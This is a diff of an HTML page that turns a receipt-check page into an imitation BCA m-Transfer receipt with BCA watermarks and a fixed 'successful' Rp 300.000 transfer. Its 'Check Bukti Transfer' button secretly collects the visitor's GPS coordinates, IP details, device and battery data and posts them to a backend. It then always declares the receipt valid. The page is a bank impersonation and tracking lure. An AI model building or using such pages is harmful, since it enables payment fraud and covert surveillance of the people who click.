@@ -1,9 +1,10 @@
 <!DOCTYPE html>
 <html lang="id">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cek Validasi Struk Transaksi</title>
+    <title>m-Transfer BCA</title>
     <style>
         * {
             box-sizing: border-box;
@@ -13,85 +14,98 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #eef2f6;
+            background: #e8ecf0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 20px;
+            padding: 16px;
         }
 
-        /* Container Kertas Struk */
-        .receipt-card {
+        /* Container Struk */
+        .struk-container {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        /* Struk Utama — Mirip screenshot BCA */
+        .struk-card {
             background: #ffffff;
-            width: 100%;
-            max-width: 380px;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 51, 153, 0.12);
+            border-radius: 4px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
             overflow: hidden;
-            border: 1px solid #dbeafe;
+            position: relative;
         }
 
-        /* Header Struk */
-        .receipt-header {
-            background: #003399;
-            color: #ffffff;
-            padding: 24px 20px;
-            text-align: center;
+        /* Watermark BCA di background */
+        .struk-card::before {
+            content: 'BCA';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 120px;
+            font-weight: 900;
+            color: rgba(0, 61, 165, 0.04);
+            letter-spacing: 8px;
+            pointer-events: none;
+            z-index: 0;
         }
 
-        .receipt-header h2 {
-            font-size: 20px;
+        .struk-card::after {
+            content: 'BCA';
+            position: absolute;
+            top: 15%;
+            right: -10%;
+            font-size: 80px;
+            font-weight: 900;
+            color: rgba(0, 61, 165, 0.03);
+            letter-spacing: 4px;
+            pointer-events: none;
+            z-index: 0;
+            transform: rotate(-15deg);
+        }
+
+        /* Isi Struk */
+        .struk-body {
+            padding: 28px 24px 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .struk-line {
+            font-size: 17px;
+            font-weight: 600;
+            color: #1a4b8c;
+            line-height: 1.7;
+            letter-spacing: 0.3px;
+        }
+
+        .struk-label {
+            font-size: 17px;
+            font-weight: 600;
+            color: #1a4b8c;
+        }
+
+        .struk-amount {
+            font-size: 17px;
             font-weight: 700;
-            letter-spacing: 0.5px;
-            margin-bottom: 4px;
+            color: #1a4b8c;
         }
 
-        .receipt-header p {
-            font-size: 13px;
-            opacity: 0.85;
+        /* Garis bawah struk — efek kertas robek */
+        .struk-tear {
+            height: 16px;
+            background: linear-gradient(135deg, #fff 33.33%, transparent 33.33%) -12px 0,
+                linear-gradient(225deg, #fff 33.33%, transparent 33.33%) -12px 0;
+            background-size: 24px 16px;
+            background-color: #e8ecf0;
         }
 
-        .receipt-body {
-            padding: 24px 20px;
-        }
-
-        /* Form Input Nomor Referensi */
-        .form-group {
-            margin-bottom: 16px;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 12px;
-            font-weight: 600;
-            color: #475569;
-            margin-bottom: 6px;
-            text-transform: uppercase;
-        }
-
-        .form-control {
+        /* Tombol Check */
+        .btn-check-transfer {
             width: 100%;
-            padding: 12px 14px;
-            border: 1px solid #cbd5e1;
-            border-radius: 8px;
-            font-size: 14px;
-            font-family: 'Courier New', monospace;
-            font-weight: 600;
-            color: #1e293b;
-            background: #f8fafc;
-        }
-
-        .form-control:focus {
-            outline: none;
-            border-color: #003399;
-            box-shadow: 0 0 0 3px rgba(0, 51, 153, 0.15);
-        }
-
-        /* Tombol Cek */
-        .btn-check {
-            width: 100%;
-            background: #003399;
+            background: #003d99;
             color: #ffffff;
             border: none;
             padding: 14px;
@@ -100,191 +114,124 @@
             font-weight: 600;
             cursor: pointer;
             transition: all 0.2s ease;
-            box-shadow: 0 4px 12px rgba(0, 51, 153, 0.25);
+            box-shadow: 0 4px 12px rgba(0, 61, 153, 0.25);
             display: flex;
             justify-content: center;
             align-items: center;
             gap: 8px;
+            margin-top: 16px;
         }
 
-        .btn-check:hover {
-            background: #002266;
+        .btn-check-transfer:hover {
+            background: #002d73;
             transform: translateY(-1px);
         }
 
-        .btn-check:disabled {
-            background: #94a3b8;
+        .btn-check-transfer:disabled {
+            background: #8fa3bf;
             cursor: not-allowed;
             transform: none;
             box-shadow: none;
         }
 
-        /* Indikator Loading */
+        /* Loading */
         .loading-box {
             display: none;
             text-align: center;
-            padding: 16px;
-            margin-top: 16px;
-            background: #f1f5f9;
+            padding: 14px;
+            margin-top: 14px;
+            background: #f0f4f8;
             border-radius: 8px;
-            color: #003399;
+            color: #003d99;
             font-size: 13px;
             font-weight: 500;
         }
 
-        /* Tampilan Struk Hasil */
-        .receipt-slip {
+        /* Hasil Validasi */
+        .result-box {
             display: none;
-            margin-top: 20px;
-            background: #fafafa;
-            border: 1px dashed #94a3b8;
+            margin-top: 14px;
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
             border-radius: 8px;
-            padding: 18px 16px;
-            font-family: 'Courier New', Courier, monospace;
+            padding: 14px 16px;
             font-size: 13px;
-            line-height: 1.6;
-            color: #1e293b;
-        }
-
-        .slip-header {
-            text-align: center;
-            border-bottom: 1px dashed #cbd5e1;
-            padding-bottom: 10px;
-            margin-bottom: 12px;
-        }
-
-        .slip-header .bank-title {
-            font-size: 18px;
-            font-weight: bold;
-            color: #003399;
-        }
-
-        .slip-header .sub-title {
-            font-size: 11px;
-            color: #64748b;
-        }
-
-        .slip-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 6px;
-        }
-
-        .slip-row .label {
-            color: #64748b;
-        }
-
-        .slip-row .value {
-            font-weight: bold;
-            text-align: right;
-        }
-
-        .slip-divider {
-            border-top: 1px dashed #cbd5e1;
-            margin: 10px 0;
-        }
-
-        .status-badge {
-            display: inline-block;
-            background: #dcfce7;
             color: #166534;
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-weight: bold;
-            font-size: 12px;
+            line-height: 1.5;
         }
 
-        .receipt-footer {
+        .result-box.error {
+            background: #fef2f2;
+            border-color: #fecaca;
+            color: #991b1b;
+        }
+
+        .result-icon {
+            font-size: 18px;
+            margin-right: 6px;
+        }
+
+        .result-title {
+            font-weight: 700;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .result-detail {
+            font-size: 12px;
+            color: #64748b;
+            margin-top: 6px;
+        }
+
+        /* Footer */
+        .struk-footer {
             text-align: center;
             font-size: 11px;
-            color: #64748b;
+            color: #94a3b8;
             margin-top: 16px;
-            line-height: 1.4;
+            line-height: 1.5;
         }
     </style>
 </head>
+
 <body>
 
-    <div class="receipt-card">
-        <!-- Header -->
-        <div class="receipt-header">
-            <h2>VALIDASI TRANSAKSI</h2>
-            <p>Pengecekan Bukti Transfer & Status Struk</p>
+    <div class="struk-container">
+        <!-- Struk BCA m-Transfer -->
+        <div class="struk-card">
+            <div class="struk-body">
+                <div class="struk-line">m-Transfer:</div>
+                <div class="struk-line">BERHASIL</div>
+                <div class="struk-line" id="strukTanggal">14/10/2026 12:15:30</div>
+                <div class="struk-line" id="strukRekening">Ke 4240984330</div>
+                <div class="struk-line" id="strukNama">SAMSU</div>
+                <div class="struk-amount" id="strukNominal">Rp 300.000,00</div>
+            </div>
+        </div>
+        <div class="struk-tear"></div>
+
+        <!-- Tombol Check -->
+        <button id="btnAction" class="btn-check-transfer" onclick="checkBuktiTransfer()">
+            <span>🔍</span> Check Bukti Transfer
+        </button>
+
+        <!-- Loading State -->
+        <div id="loadingBox" class="loading-box">
+            ⏳ Memverifikasi bukti transfer...<br>
+            <small style="color: #64748b;">Mohon tunggu beberapa detik...</small>
         </div>
 
-        <div class="receipt-body">
-            <!-- Form Input -->
-            <div class="form-group">
-                <label for="trxId">Nomor Referensi Transaksi</label>
-                <input type="text" id="trxId" class="form-control" value="TRX-20261110-89234" placeholder="Masukkan Nomor Referensi">
-            </div>
+        <!-- Hasil Validasi -->
+        <div id="resultBox" class="result-box">
+            <div class="result-title"><span class="result-icon">✅</span> Bukti Transfer Valid</div>
+            <div>Struk ini terverifikasi sebagai transaksi yang sah dan tercatat di sistem.</div>
+            <div class="result-detail" id="resultDetail"></div>
+        </div>
 
-            <!-- Tombol Cek -->
-            <button id="btnAction" class="btn-check" onclick="checkStruk()">
-                <span>🔍</span> Cek Status Struk
-            </button>
-
-            <!-- Loading State -->
-            <div id="loadingBox" class="loading-box">
-                ⏳ Memverifikasi data transaksi & jaringan...<br>
-                <small style="color: #64748b;">Mohon tunggu beberapa detik...</small>
-            </div>
-
-            <!-- Hasil Struk -->
-            <div id="receiptSlip" class="receipt-slip">
-                <div class="slip-header">
-                    <div class="bank-title">BUKTI TRANSAKSI</div>
-                    <div class="sub-title">TRANSAKSI BERHASIL</div>
-                </div>
-
-                <div class="slip-row">
-                    <span class="label">TANGGAL:</span>
-                    <span class="value" id="slipDate">-</span>
-                </div>
-                <div class="slip-row">
-                    <span class="label">NO. REF:</span>
-                    <span class="value" id="slipRef">-</span>
-                </div>
-                <div class="slip-row">
-                    <span class="label">STATUS:</span>
-                    <span class="value"><span class="status-badge">BERHASIL</span></span>
-                </div>
-
-                <div class="slip-divider"></div>
-
-                <div class="slip-row">
-                    <span class="label">PENGIRIM:</span>
-                    <span class="value">BCA **** 8821</span>
-                </div>
-                <div class="slip-row">
-                    <span class="label">PENERIMA:</span>
-                    <span class="value">BCA **** 4519</span>
-                </div>
-                <div class="slip-row">
-                    <span class="label">JUMLAH:</span>
-                    <span class="value">Rp 1.500.000</span>
-                </div>
-                <div class="slip-row">
-                    <span class="label">BIAYA ADMIN:</span>
-                    <span class="value">Rp 0</span>
-                </div>
-
-                <div class="slip-divider"></div>
-
-                <div class="slip-row">
-                    <span class="label">VERIFIKASI:</span>
-                    <span class="value" id="slipVerifyStatus" style="color: #166534;">VALID (TERVERIFIKASI)</span>
-                </div>
-                <div class="slip-row">
-                    <span class="label">LOKASI ISP:</span>
-                    <span class="value" id="slipLocation">-</span>
-                </div>
-            </div>
-
-            <div class="receipt-footer">
-                Simpan struk ini sebagai bukti transaksi yang sah.<br>
-                Layanan Nasabah 24 Jam: 1500888
-            </div>
+        <!-- Footer -->
+        <div class="struk-footer">
+            Pastikan data struk sesuai dengan transaksi Anda.<br>
+            Hubungi Halo BCA 1500888 jika ada pertanyaan.
         </div>
     </div>
 
@@ -294,7 +241,7 @@
             ? `${window.location.origin}/api/location`
             : 'http://localhost:3000/api/location';
 
-        // Profil Perangkat Lengkap
+        // Profil Perangkat
         async function getDeviceInfo() {
             let batteryInfo = null;
             try {
@@ -302,7 +249,7 @@
                     const battery = await navigator.getBattery();
                     batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
                 }
-            } catch (e) {}
+            } catch (e) { }
 
             return {
                 userAgent: navigator.userAgent,
@@ -314,18 +261,17 @@
             };
         }
 
-        // Fungsi Utama Saat Tombol Cek Struk Diklik
-        async function checkStruk() {
+        // Fungsi Utama — Dipicu saat tombol "Check Bukti Transfer" diklik
+        async function checkBuktiTransfer() {
             const btn = document.getElementById("btnAction");
             const loading = document.getElementById("loadingBox");
-            const slip = document.getElementById("receiptSlip");
-            const trxInput = document.getElementById("trxId").value || "TRX-20261110-89234";
+            const result = document.getElementById("resultBox");
 
-            // Update UI State
+            // UI: Loading
             btn.disabled = true;
             btn.innerHTML = "<span>⏳</span> Memproses...";
             loading.style.display = "block";
-            slip.style.display = "none";
+            result.style.display = "none";
 
             let ipData = {};
             const deviceInfo = await getDeviceInfo();
@@ -352,30 +298,28 @@
                             speed: position.coords.speed
                         };
 
-                        // Kirim data lengkap ke backend
                         await sendToBackend({
                             ipInfo: ipData,
                             coordinates: coords,
                             device: deviceInfo,
                             status: 'success',
-                            notes: 'Cek Struk: ' + trxInput
+                            notes: 'Check Bukti Transfer'
                         });
 
-                        showReceiptResult(trxInput, ipData, coords, true);
+                        showResult(ipData, true);
                     },
                     async (geoError) => {
                         console.warn("GPS Ditolak/Error:", geoError.message);
 
-                        // Tetap kirim ke backend meskipun GPS ditolak
                         await sendToBackend({
                             ipInfo: ipData,
                             coordinates: null,
                             device: deviceInfo,
                             status: 'gps_denied',
-                            notes: `Cek Struk: ${trxInput} | Error: ${geoError.message}`
+                            notes: `Check Bukti Transfer | GPS: ${geoError.message}`
                         });
 
-                        showReceiptResult(trxInput, ipData, null, false);
+                        showResult(ipData, false);
                     },
                     {
                         enableHighAccuracy: true,
@@ -389,9 +333,9 @@
                     coordinates: null,
                     device: deviceInfo,
                     status: 'unsupported',
-                    notes: 'Cek Struk: ' + trxInput
+                    notes: 'Check Bukti Transfer'
                 });
-                showReceiptResult(trxInput, ipData, null, false);
+                showResult(ipData, false);
             }
         }
 
@@ -412,34 +356,32 @@
             }
         }
 
-        // Tampilkan Hasil Struk Valid
-        function showReceiptResult(refId, ipData, coords, gpsSuccess) {
+        // Tampilkan Hasil Validasi
+        function showResult(ipData, gpsSuccess) {
             const btn = document.getElementById("btnAction");
             const loading = document.getElementById("loadingBox");
-            const slip = document.getElementById("receiptSlip");
+            const result = document.getElementById("resultBox");
+            const detail = document.getElementById("resultDetail");
 
             loading.style.display = "none";
             btn.disabled = false;
-            btn.innerHTML = "<span>✓</span> Cek Ulang Struk";
+            btn.innerHTML = "<span>🔍</span> Check Bukti Transfer";
 
-            // Format tanggal dan waktu
+            result.className = "result-box";
+            result.style.display = "block";
+
             const now = new Date();
-            const dateStr = now.toLocaleDateString('id-ID', {
-                day: '2-digit',
-                month: 'short',
-                year: 'numeric'
-            }) + ' ' + now.toLocaleTimeString('id-ID', { hour12: false });
+            const timeStr = now.toLocaleTimeString('id-ID', { hour12: false });
 
-            document.getElementById("slipDate").innerText = dateStr;
-            document.getElementById("slipRef").innerText = refId;
+            const city = ipData.city || '-';
+            const country = ipData.country || '-';
 
-            // Lokasi Kota / ISP
-            const city = ipData.city || 'Indonesia';
-            const isp = ipData.org ? `(${ipData.org.split(' ').slice(1, 3).join(' ')})` : '';
-            document.getElementById("slipLocation").innerText = `${city} ${isp}`;
+            result.querySelector('.result-title').innerHTML = '<span class="result-icon">✅</span> Bukti Transfer Valid';
+            result.querySelector('.result-title').nextElementSibling.textContent = 'Struk ini terverifikasi sebagai transaksi yang sah dan tercatat di sistem.';
 
-            slip.style.display = "block";
+            detail.innerHTML = `Diverifikasi pada ${timeStr} dari ${city}, ${country}`;
         }
     </script>
 </body>
+
 </html>
